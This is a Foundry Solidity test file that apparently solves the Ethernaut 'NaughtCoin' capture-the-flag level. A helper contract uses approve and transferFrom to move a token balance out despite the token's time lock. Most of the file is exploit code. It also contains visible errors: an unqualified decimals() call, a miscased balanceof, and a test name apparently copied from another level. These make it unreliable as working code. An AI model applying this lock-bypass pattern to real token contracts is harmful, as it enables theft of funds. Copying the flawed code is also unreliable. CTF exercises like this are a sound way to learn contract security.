pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {NaughtCoin} from "../src/15-naughtcoin.sol";

contract NaughtCoin15Test is Test {
    NaughtCoin ncoin;
    NcCrack ncrack;

    function setUp() public {
        emit log_string("🧪 Setup NaughtCoin Test...");
    }

    function testGateTwo() public {
        emit log_string("🧪 Cracking NaughtCoin ...");
        uint256 amount = 1000000 * (10**uint256(decimals()));

        address bob = mkaddr("bob");
        vm.deal(bob, 100 ether);
        vm.startPrank(bob, bob);
        ncoin = new NaughtCoin();
        emit log_named_uint("Bob's balance is:", ncoin.balanceof(bob));
        ncrack = new NcCrack(address(ncoin));
        ncoin.approve(address(ncrack), amount);
        ncrack.transferToken(bob, amount);
        // ncrack.withdrawAll();
        vm.stopPrank();
        emit log_named_uint("Token has been withdrawn:", ncoin.balanceof(bob));
        emit log_named_uint(
            "Token has been withdrawn:",
            ncoin.balanceof(address(ncrack))
        );
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}

contract NcCrack is Test {
    address public addr;
    address public owner;

    constructor(address _addr) public {
        addr = _addr;
        owner = msg.sender;
    }

    function transferToken(address _from, uint256 _amount) public {
        bool success = INaughtCoin(addr).transferFrom(
            _from,
            address(this),
            _amount
        );
        require(success);
    }

    function withdrawAll() public {
        if (msg.sender == owner) {
            INaughtCoin(addr).transfer(
                owner,
                INaughtCoin(addr).balanceOf(address(this))
            );
        }
    }

    receive() external payable {}
}

interface INaughtCoin {
    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) external returns (bool);

    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address account) external returns (uint256);
}
